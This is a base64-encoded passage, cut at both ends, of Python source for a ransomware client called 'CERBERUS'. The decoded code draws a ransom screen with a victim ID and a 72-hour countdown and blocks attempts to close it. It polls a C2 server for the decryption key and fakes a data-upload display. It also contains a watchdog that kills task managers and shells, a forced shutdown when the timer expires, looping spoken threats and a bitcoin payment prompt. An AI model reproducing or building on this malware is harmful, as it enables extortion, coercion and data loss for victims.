CAgICAgc2VsZi5tYXN0ZXIgPSBtYXN0ZXIKICAgICAgICBzZWxmLnZpY3RpbV9pZCA9IHZpY3RpbV9pZAogICAgICAgIHNlbGYuZG9vbXNkYXlfdHJpZ2dlcmVkID0gRmFsc2UKICAgICAgICBzZWxmLnBheW1lbnRfbW9kZV9hY3RpdmUgPSBGYWxzZQoKICAgICAgICAjIFdJTkRPV0VEIE1PREUgKE1vdmFibGUsIEZha2UtQ2xvc2FibGUpCiAgICAgICAgbWFzdGVyLnRpdGxlKCJDRVJCRVJVUyBSQU5TT01XQVJFIC0gRU5DUllQVEVEIikKICAgICAgICBtYXN0ZXIuZ2VvbWV0cnkoIjEwMjR4NzY4IikgCiAgICAgICAgbWFzdGVyLmF0dHJpYnV0ZXMoJy1mdWxsc2NyZWVuJywgRmFsc2UpIAogICAgICAgIG1hc3Rlci5vdmVycmlkZXJlZGlyZWN0KEZhbHNlKSAjIFNob3cgVGl0bGUgQmFyIChYIGJ1dHRvbikKICAgICAgICBtYXN0ZXIuYXR0cmlidXRlcygnLXRvcG1vc3QnLCBUcnVlKQogICAgICAgIG1hc3Rlci5jb25maWd1cmUoYmc9JyMwYTBhMGEnKQogICAgICAgIG1hc3Rlci5yZXNpemFibGUoRmFsc2UsIEZhbHNlKQogICAgICAgIAogICAgICAgICMgUkFHRUJBSVQgQ0xPU0UKICAgICAgICBtYXN0ZXIucHJvdG9jb2woIldNX0RFTEVURV9XSU5ET1ciLCBzZWxmLnJhZ2ViYWl0X2Nsb3NlKSAKICAgICAgICAKICAgICAgICAjIERpc2FibGUgbWluaW1hbGl6ZS9rZXlib2FyZCBzaG9ydGN1dHMKICAgICAgICBtYXN0ZXIuYmluZCgnPEVzY2FwZT4nLCBsYW1iZGEgZTogImJyZWFrIikKICAgICAgICAKICAgICAgICAjIEFnZ3Jlc3NpdmUgTG9vcAogICAgICAgIHNlbGYuZm9yY2VfZm9jdXNfbG9vcCgpCgogICAgICAgICMgR1VJIEVsZW1lbnRzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBsb2dvX2RhdGEgPSBiYXNlNjQuYjY0ZGVjb2RlKExPR09fQkFTRTY0KQogICAgICAgICAgICBzZWxmLmxvZ28gPSBQaG90b0ltYWdlKGRhdGE9bG9nb19kYXRhKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc2VsZi5sb2dvID0gTm9uZQoKICAgICAgICBtYWluX2ZyYW1lID0gRnJhbWUobWFzdGVyLCBiZz0nIzBhMGEwYScpCiAgICAgICAgbWFpbl9mcmFtZS5wYWNrKGV4cGFuZD1UcnVlLCBmaWxsPSdib3RoJywgcGFkeD0yMCwgcGFkeT0yMCkKCiAgICAgICAgaWYgc2VsZi5sb2dvOgogICAgICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCBpbWFnZT1zZWxmLmxvZ28sIGJnPScjMGEwYTBhJykucGFjayhwYWR5PTEwKQoKICAgICAgICB0aXRsZV9mb250ID0gdGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTI0LCB3ZWlnaHQ9ImJvbGQiKQogICAgICAgIGJvZHlfZm9udCA9IHRrZm9udC5Gb250KGZhbWlseT0iSGVsdmV0aWNhIiwgc2l6ZT0xMikKICAgICAgICBtb25vX2ZvbnQgPSB0a2ZvbnQuRm9udChmYW1pbHk9IkNvdXJpZXIiLCBzaXplPTEyKQogICAgICAgIHRpbWVyX2ZvbnQgPSB0a2ZvbnQuRm9udChmYW1pbHk9IkNvdXJpZXIiLCBzaXplPTM2LCB3ZWlnaHQ9ImJvbGQiKQoKICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQiLCBmb250PXRpdGxlX2ZvbnQsIGZnPScjZmY0ZDRkJywgYmc9JyMwYTBhMGEnKS5wYWNrKHBhZHk9MTApCiAgICAgICAgTGFiZWwobWFpbl9mcmFtZSwgdGV4dD0iWW91ciBkb2N1bWVudHMsIHBob3RvcywgYW5kIG90aGVyIGltcG9ydGFudCBmaWxlcyBoYXZlIGJlZW4gbG9ja2VkLiIsIGZvbnQ9Ym9keV9mb250LCBmZz0nI2NjY2NjYycsIGJnPScjMGEwYTBhJywgd3JhcGxlbmd0aD03MDApLnBhY2socGFkeT01KQogICAgICAgIAogICAgICAgICMgRE9PTVNEQVkgVElNRVIKICAgICAgICBzZWxmLnRpbWVfbGVmdCA9IDcyICogMzYwMCAKICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJUSU1FIFJFTUFJTklORyBVTlRJTCBQRVJNQU5FTlQgREFUQSBMT1NTOiIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTEyLCB3ZWlnaHQ9ImJvbGQiKSwgZmc9JyNmZjMzMzMnLCBiZz0nIzBhMGEwYScpLnBhY2socGFkeT0oMjAsIDUpKQogICAgICAgIHNlbGYudGltZXJfbGFiZWwgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSI3MjowMDowMCIsIGZvbnQ9dGltZXJfZm9udCwgZmc9JyNmZjAwMDAnLCBiZz0nIzBhMGEwYScpCiAgICAgICAgc2VsZi50aW1lcl9sYWJlbC5wYWNrKHBhZHk9NSkKICAgICAgICAKICAgICAgICAjIEZBS0UgRVhGSUxUUkFUSU9OCiAgICAgICAgc2VsZi5leGZpbF9zdGF0dXMgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJTeXN0ZW0gU2NhbjogQW5hbHl6aW5nIHByaXZhdGUgZGF0YS4uLiIsIGZvbnQ9bW9ub19mb250LCBmZz0nI2ZmZmYwMCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLmV4ZmlsX3N0YXR1cy5wYWNrKHBhZHk9KDE1LCA1KSkKICAgICAgICBzZWxmLmV4ZmlsX3Byb2dyZXNzID0gTGFiZWwobWFpbl9mcmFtZSwgdGV4dD0iWyAgICAgICAgICAgICAgICAgICAgXSAwJSIsIGZvbnQ9bW9ub19mb250LCBmZz0nI2ZmZmYwMCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLmV4ZmlsX3Byb2dyZXNzLnBhY2soKQogICAgICAgIAogICAgICAgIExhYmVsKG1haW5fZnJhbWUsIHRleHQ9ZiJZT1VSIFZJQ1RJTSBJRCBJUzoiLCBmb250PWJvZHlfZm9udCwgZmc9JyNmZmZmZmYnLCBiZz0nIzBhMGEwYScpLnBhY2socGFkeT0oMjAsIDUpKQogICAgICAgIHNlbGYudmljdGltX2lkX2xhYmVsID0gTGFiZWwobWFpbl9mcmFtZSwgdGV4dD1zZWxmLnZpY3RpbV9pZCwgZm9udD10a2ZvbnQuRm9udChmYW1pbHk9IkNvdXJpZXIiLCBzaXplPTIwLCB3ZWlnaHQ9ImJvbGQiKSwgZmc9JyM0ZGZmODgnLCBiZz0nIzBhMGEwYScpCiAgICAgICAgc2VsZi52aWN0aW1faWRfbGFiZWwucGFjaygpCgogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsID0gTGFiZWwobWFpbl9mcmFtZSwgdGV4dD0iU1RBVFVTOiBBd2FpdGluZyBwYXltZW50IGNvbmZpcm1hdGlvbi4uLiAoRG9uJ3QgY2xvc2UgdGhpcyB3aW5kb3cpIiwgZm9udD1ib2R5X2ZvbnQsIGZnPScjZmZmZjRkJywgYmc9JyMwYTBhMGEnKQogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLnBhY2socGFkeT0oMjAsIDUpKQogICAgICAgIAogICAgICAgIHNlbGYua2V5X3ZhciA9IFN0cmluZ1ZhcigpCiAgICAgICAgc2VsZi5rZXlfZW50cnkgPSBFbnRyeShtYWluX2ZyYW1lLCB0ZXh0dmFyaWFibGU9c2VsZi5rZXlfdmFyLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MTIpLCBzaG93PSIqIiwgd2lkdGg9NTAsIGJnPScjMmEyYTJhJywgZmc9JyNmZmZmZmYnLCBpbnNlcnRiYWNrZ3JvdW5kPSd3aGl0ZScsIGp1c3RpZnk9J2NlbnRlcicpCiAgICAgICAgc2VsZi5rZXlfZW50cnkucGFjayhwYWR5PTEwLCBpcGFkeT01KQogICAgICAgIHNlbGYua2V5X2VudHJ5LmNvbmZpZyhzdGF0ZT0ncmVhZG9ubHknKQoKICAgICAgICBzZWxmLmRlY3J5cHRfYnV0dG9uID0gQnV0dG9uKG1haW5fZnJhbWUsIHRleHQ9IkRFQ1JZUFQgRklMRVMiLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iSGVsdmV0aWNhIiwgc2l6ZT0xNCwgd2VpZ2h0PSJib2xkIiksIGNvbW1hbmQ9c2VsZi5zdGFydF9kZWNyeXB0aW9uLCBiZz0nI2ZmNGQ0ZCcsIGZnPSd3aGl0ZScsIHBhZHg9MjAsIHBhZHk9MTApCiAgICAgICAgc2VsZi5kZWNyeXB0X2J1dHRvbi5wYWNrKHBhZHk9MTApCiAgICAgICAgc2VsZi5kZWNyeXB0X2J1dHRvbi5jb25maWcoc3RhdGU9J2Rpc2FibGVkJykgCiAgICAgICAgCiAgICAgICAgIyBQQVlNRU5UIEJVVFRPTiAoRml4ZWQgTGF5b3V0IC0gUGFja2VkIGF0IGJvdHRvbSkKICAgICAgICBzZWxmLnBheV9idXR0b24gPSBCdXR0b24obWFpbl9mcmFtZSwgdGV4dD0iUEFZIFJBTlNPTSBOT1ciLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iSGVsdmV0aWNhIiwgc2l6ZT0xMSwgd2VpZ2h0PSJib2xkIiksIGNvbW1hbmQ9c2VsZi5lbmFibGVfcGF5bWVudF9tb2RlLCBiZz0nIzAwN2JmZicsIGZnPSd3aGl0ZScsIHBhZHg9MTUsIHBhZHk9OCkKICAgICAgICBzZWxmLnBheV9idXR0b24ucGFjayhzaWRlPSdib3R0b20nLCBwYWR5PTIwKQoKICAgICAgICAjIFN0YXJ0IHRocmVhZHMKICAgICAgICBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZyA9IFRydWUKICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zZWxmLmhlYXJ0YmVhdF9wb2xsaW5nLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYudXBkYXRlX3RpbWVyLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuZmFrZV9leGZpbHRyYXRpb24sIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgCiAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMjAwMCwgc2VsZi5jaGFuZ2Vfd2FsbHBhcGVyKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuYXVkaW9fbG9vcCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICAjIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYud2F0Y2hkb2dfbG9vcCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkgIyBESVNBQkxFRDogQ2F1c2luZyBTeXN0ZW0gTGFnCgogICAgZGVmIHJhZ2ViYWl0X2Nsb3NlKHNlbGYpOgogICAgICAgICIiIkludGVyY2VwdHMgY2xvc2UgcmVxdWVzdCBhbmQgdHJvbGxzIHRoZSB1c2VyLiIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbWVzc2FnZWJveC5hc2t5ZXNubygiRXhpdCBBcHBsaWNhdGlvbiIsICJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gcXVpdCB0aGlzIGFwcGxpY2F0aW9uPyIpOgogICAgICAgICAgICAgICAgbWVzc2FnZWJveC5zaG93ZXJyb3IoIkFjY2VzcyBEZW5pZWQiLCAiTE9MIHlvdSB0aG91Z2h0IHlvdSBjb3VsZCBlc2NhcGUuIEFjY2VzcyBEZW5pZWQuIikKICAgICAgICAgICAgICAgICMgUnVuIFRUUyBpbiBhIHNlcGFyYXRlIHRocmVhZCB0byBhdm9pZCBibG9ja2luZyBHVUkKICAgICAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuc3BlYWtfbWVzc2FnZSwgYXJncz0oIllvdSBjYW5ub3QgbGVhdmUuIiwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIGV4Y2VwdDogcGFzcwoKICAgIGRlZiBmb3JjZV9mb2N1c19sb29wKHNlbGYpOgogICAgICAgICIiIkFnZ3Jlc3NpdmVseSBrZWVwcyB3aW5kb3cgb24gdG9wLCB1bmxlc3MgcGF5aW5nLiBSRURVQ0VEIEZSRVFVRU5DWS4iIiIKICAgICAgICBpZiBub3Qgc2VsZi5wYXltZW50X21vZGVfYWN0aXZlOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzZWxmLm1hc3Rlci5saWZ0KCkKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICMgUmVkdWNlZCB0byAzMDAwbXMgdG8gc3RvcCBzdHV0dGVyaW5nCiAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMzAwMCwgc2VsZi5mb3JjZV9mb2N1c19sb29wKQoKICAgIGRlZiBzcGVha19tZXNzYWdlKHNlbGYsIG1lc3NhZ2UpOgogICAgICAgICIiIkNyb3NzLXBsYXRmb3JtIFRUUy4gU3luY2hyb25vdXMgKGJsb2NraW5nKSB2ZXJzaW9uIGZvciB0aHJlYWRzLiIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgICAgICAgICAgY21kID0gZiJBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5TcGVlY2g7IChOZXctT2JqZWN0IFN5c3RlbS5TcGVlY2guU3ludGhlc2lzLlNwZWVjaFN5bnRoZXNpemVyKS5TcGVhaygne21lc3NhZ2V9JykiCiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInBvd2Vyc2hlbGwiLCAiLUNvbW1hbmQiLCBjbWRdLCBjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIHNodXRpbC53aGljaCgiZXNwZWFrIik6CiAgICAgICAgICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MucnVuKFsiZXNwZWFrIiwgbWVzc2FnZV0sIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCiAgICAgICAgICAgICAgICBlbGlmIHNodXRpbC53aGljaCgic3BkLXNheSIpOgogICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbInNwZC1zYXkiLCBtZXNzYWdlXSwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgIGRlZiBhdWRpb19sb29wKHNlbGYpOgogICAgICAgICIiIlJlcGVhdHMgdGhlIHZvaWNlIG1lc3NhZ2UgZXZlcnkgMzAgc2Vjb25kcy4iIiIKICAgICAgICBtZXNzYWdlID0gIllvdXIgZmlsZXMgYXJlIGVuY3J5cHRlZC4gUGF5bWVudCBpcyByZXF1aXJlZC4gU3lzdGVtIGZhaWx1cmUgaW1taW5lbnQuIgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICBzZWxmLnNwZWFrX21lc3NhZ2UobWVzc2FnZSkKICAgICAgICAgICAgdGltZS5zbGVlcCgzMCkKICAgICAgICAgICAgCiAgICBkZWYgd2F0Y2hkb2dfbG9vcChzZWxmKToKICAgICAgICAiIiJLaWxscyB0YXNrIG1hbmFnZXJzIGFuZCB0ZXJtaW5hbHMuIiIiCiAgICAgICAgYmxhY2tsaXN0ID0gWwogICAgICAgICAgICAndGFza21ncicsICdjbWQnLCAncG93ZXJzaGVsbCcsIAogICAgICAgICAgICAnZ25vbWUtdGVybWluYWwtc2VydmVyJywgJ2dub21lLXRlcm1pbmFsJywgIyBHTk9NRQogICAgICAgICAgICAna29uc29sZScsICMgS0RFCiAgICAgICAgICAgICd4ZmNlNC10ZXJtaW5hbCcsICd4dGVybScsICd1eHRlcm0nLAogICAgICAgICAgICAnYmFzaCcsICdzaCcsICd6c2gnLCAnZmlzaCcsICMgU2hlbGxzIChBZ2dyZXNzaXZlKQogICAgICAgICAgICAnaHRvcCcsICd0b3AnLCAnYnRvcCcsICd3aXJlc2hhcmsnCiAgICAgICAgXQogICAgICAgIAogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgICAgICAgICAgZm9yIHByb2MgaW4gYmxhY2tsaXN0OgogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oZiJ0YXNra2lsbCAvRiAvSU0ge3Byb2N9LmV4ZSA+bnVsIDI+JjEiKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAjIExpbnV4IE9wdGltaXphdGlvbjogcGtpbGwgaW1wbGllcyBpbnRlcm5hbCBsb29wLCBjYWxsaW5nIGl0IDEweCBwZXIgc2VjIGlzIGJhZC4KICAgICAgICAgICAgICAgICAgICAjIFdlIHJ1biB0aGlzIGV2ZXJ5IDMgc2Vjb25kcyBub3cuCiAgICAgICAgICAgICAgICAgICAgZm9yIHByb2MgaW4gYmxhY2tsaXN0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKGYicGtpbGwgLTkgLWYge3Byb2N9ID4vZGV2L251bGwgMj4mMSIpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgIyBJbmNyZWFzZWQgZnJvbSAxLjBzIHRvIDMuMHMgdG8gcmVkdWNlIHN5c3RlbSBsb2FkL3N0dXR0ZXJpbmcKICAgICAgICAgICAgdGltZS5zbGVlcCgzLjApIAoKICAgIGRlZiBjaGFuZ2Vfd2FsbHBhcGVyKHNlbGYpOgogICAgICAgIHBhc3MKCiAgICBkZWYgdHJpZ2dlcl9kb29tc2RheShzZWxmKToKICAgICAgICBpZiBzZWxmLmRvb21zZGF5X3RyaWdnZXJlZDogcmV0dXJuCiAgICAgICAgc2VsZi5kb29tc2RheV90cmlnZ2VyZWQgPSBUcnVlCiAgICAgICAgCiAgICAgICAgdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi5zcGVha19tZXNzYWdlLCBhcmdzPSgiVGltZSBoYXMgZXhwaXJlZC4gU3lzdGVtIGZhaWx1cmUgaW1taW5lbnQuIiwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHNlbGYubWFzdGVyLmNvbmZpZ3VyZShiZz0nI2ZmMDAwMCcpICMgUkVEIEFMRVJUCiAgICAgICAgCiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6CiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInNodXRkb3duIC9zIC90IDE1IC9jIFwiQ0VSQkVSVVM6IFRJTUUgRVhQSVJFRFwiIikKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgic2h1dGRvd24gLWggKzEgXCJDRVJCRVJVUzogVElNRSBFWFBJUkVEXCIiKSAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICBkZWYgdXBkYXRlX3RpbWVyKHNlbGYpOgogICAgICAgIHdoaWxlIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nIGFuZCBzZWxmLnRpbWVfbGVmdCA+IDA6CiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICAgICAgc2VsZi50aW1lX2xlZnQgLT0gMQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgc2VsZi50aW1lX2xlZnQgPD0gMDoKICAgICAgICAgICAgICAgIHNlbGYubWFzdGVyLmFmdGVyKDAsIHNlbGYudHJpZ2dlcl9kb29tc2RheSkKICAgICAgICAgICAgICAgIHRyeTogc2VsZi50aW1lcl9sYWJlbC5jb25maWcodGV4dD0iMDA6MDA6MDAiKQogICAgICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAKICAgICAgICAgICAgbSwgcyA9IGRpdm1vZChzZWxmLnRpbWVfbGVmdCwgNjApCiAgICAgICAgICAgIGgsIG0gPSBkaXZtb2QobSwgNjApCiAgICAgICAgICAgIHRpbWVfc3RyID0gZiJ7aDowMmR9OnttOjAyZH06e3M6MDJkfSIKICAgICAgICAgICAgCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHNlbGYudGltZXJfbGFiZWwuY29uZmlnKHRleHQ9dGltZV9zdHIpCiAgICAgICAgICAgICAgICBpZiBzZWxmLnRpbWVfbGVmdCA8IDM2MDA6CiAgICAgICAgICAgICAgICAgICAgc2VsZi50aW1lcl9sYWJlbC5jb25maWcoZmc9JyNmZjAwMDAnIGlmIHNlbGYudGltZV9sZWZ0ICUgMiA9PSAwIGVsc2UgJyNmZmZmZmYnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCgogICAgZGVmIGZha2VfZXhmaWx0cmF0aW9uKHNlbGYpOgogICAgICAgIHN0YWdlcyA9IFsgIlNjYW5uaW5nLi4uIiwgIkNvbXByZXNzaW5nLi4uIiwgIkVuY3J5cHRpbmcuLi4iLCAiQ29ubmVjdGluZy4uLiIsICJVcGxvYWRpbmcuLi4iLCAiQ29tcGxldGUuIiBdCiAgICAgICAgZm9yIHN0YWdlIGluIHN0YWdlczoKICAgICAgICAgICAgaWYgbm90IHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nOiBicmVhawogICAgICAgICAgICB0cnk6IHNlbGYuZXhmaWxfc3RhdHVzLmNvbmZpZyh0ZXh0PWYiU1RBVFVTOiB7c3RhZ2V9IikKICAgICAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICB0cnk6IHNlbGYuZXhmaWxfc3RhdHVzLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IFVQTE9BRCBDT01QTEVURSIsIGZnPScjZmYwMDAwJykKICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICBkZWYgaGVhcnRiZWF0X3BvbGxpbmcoc2VsZik6CiAgICAgICAgd2hpbGUgc2VsZi5oZWFydGJlYXRfdGhyZWFkX3J1bm5pbmc6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMuZ2V0KGYie0MyX1NFUlZFUl9VUkx9L2FwaS9zdGF0dXMve3NlbGYudmljdGltX2lkfT90aW1lX2xlZnQ9e3NlbGYudGltZV9sZWZ0fSIsIHRpbWVvdXQ9NSkKICAgICAgICAgICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgICAgICBkYXRhID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgICAgICAgICAgICAgaWYgIm5ld190aW1lciIgaW4gZGF0YToKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50aW1lX2xlZnQgPSBpbnQoZGF0YVsibmV3X3RpbWVyIl0pCiAgICAgICAgICAgICAgICAgICAgaWYgZGF0YS5nZXQoInN0YXR1cyIpID09ICJyZWFkeSI6CiAgICAgICAgICAgICAgICAgICAgICAgIGtleSA9IGRhdGEuZ2V0KCJrZXkiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBrZXk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBzZWxmLnVwZGF0ZV9rZXlfZmllbGQsIGtleSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuaGVhcnRiZWF0X3RocmVhZF9ydW5uaW5nID0gRmFsc2UKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICB0aW1lLnNsZWVwKDUpIAoKICAgIGRlZiB1cGRhdGVfa2V5X2ZpZWxkKHNlbGYsIGtleSk6CiAgICAgICAgc2VsZi5rZXlfdmFyLnNldChrZXkpCiAgICAgICAgc2VsZi5rZXlfZW50cnkuY29uZmlnKHN0YXRlPSdub3JtYWwnKQogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLmNvbmZpZyh0ZXh0PSJTVEFUVVM6IFZhbGlkIGtleSByZWNlaXZlZC4gRGVjcnlwdGlvbiBlbmFibGVkLiIsIGZnPScjNGRmZjg4JykKICAgICAgICBzZWxmLmRlY3J5cHRfYnV0dG9uLmNvbmZpZyhzdGF0ZT0nbm9ybWFsJykKICAgICAgICBzZWxmLmtleV9lbnRyeS5jb25maWcoc3RhdGU9J3JlYWRvbmx5JykKICAgICAgICAKICAgIGRlZiBlbmFibGVfcGF5bWVudF9tb2RlKHNlbGYpOgogICAgICAgIHNlbGYucGF5bWVudF9tb2RlX2FjdGl2ZSA9IFRydWUKICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD0iU1RBVFVTOiBCUk9XU0VSIFVOTE9DS0VEIEZPUiBQQVlNRU5ULiBETyBOT1QgQ0xPU0UuIiwgZmc9J2N5YW4nKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgIHNlbGYubWFzdGVyLmdyYWJfcmVsZWFzZSgpCiAgICAgICAgICAgICBzZWxmLm1hc3Rlci5hdHRyaWJ1dGVzKCctdG9wbW9zdCcsIEZhbHNlKQogICAgICAgICAgICAgc2VsZi5tYXN0ZXIub3ZlcnJpZGVyZWRpcmVjdChGYWxzZSkgCiAgICAgICAgICAgICBzZWxmLm1hc3Rlci5pY29uaWZ5KCkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAKICAgICAgICB0cnk6CiAgICAgICAgICAgIGltcG9ydCB3ZWJicm93c2VyCiAgICAgICAgICAgIHdlYmJyb3dzZXIub3BlbigiaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9zZWFyY2g/cT1iaXRjb2luK3BheW1lbnQiKSAKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgCiAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMTIwMDAwLCBzZWxmLmRpc2FibGVfcGF5bWVudF9tb2RlKQoKICAgIGRlZiBkaXNhYmxlX3BheW1lbnRfbW9kZShzZWxmKToKICAgICAgICBzZWxmLnBheW1lbnRfbW9kZV9hY3RpdmUgPSBGYWxzZQogICAgICAgIHNlbGYubWFzdGVyLmRlaWNvbmlmeSgpIAogICAgICAgIHNlbGYubWFzdGVyLmF0dHJpYnV0ZXMoJy1mdWxsc2NyZWVuJywgRmFsc2UpICMgTm90IGZ1bGxzY3JlZW4gYW55bW9yZSEKICAgICAgICBzZWxmLm1hc3Rlci5hdHRyaWJ1dGVzKCctdG9wbW9zdCcsIFRydWUpCiAgICAgICAgc2VsZi5tYXN0ZXIub3ZlcnJpZGVyZWRpcmVjdChGYWxzZSkKICAgICAgICBzZWxmLnN0YXR1c19sYWJlbC5jb25maWcodGV4dD0iU1RBVFVTOiBMT0NLRUQuIiwgZmc9JyNmZmZmNGQnKQoKICAgIGRlZiBzdGFydF9kZWNyeXB0aW9uKHNlbGYpOgogICAgICAgIGtleV9iNjQgPSBzZWxmLmtleV92YXIuZ2V0KCkKICAgICAgICBpZiBub3Qga2V5X2I2NDoKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgCiAgICAgICAgc2VsZi5zdGF0dXNfbGFiZWwuY29uZmlnKHRleHQ9IlNUQVRVUzogRGVjcnlwdGluZyBmaWxlcy4uLiBQbGVhc2Ugd2FpdC4iLCBmZz0neWVsbG93JykKICAgICAgICBzZWxmLm1hc3Rlci51cGRhdGUoKQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAga2V5ID0gYmFzZTY0LmI2NGRlY29kZShrZXlfYjY0KQogICAgICAgICAgICBkZWNyeXB0ZWRfZmlsZXMgPSAwCiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKFRBUkdFVF9ESVJFQ1RPUlkpOgogICAgICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoVEFSR0VUX0RJUkVDVE9SWSk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGUuZW5kc3dpdGgoRU5DUllQVEVEX0VYVEVOU0lPTik6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRlY3J5cHRfZmlsZV9hZXNfZ2NtKGZpbGVfcGF0aCwga2V5KToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZWNyeXB0ZW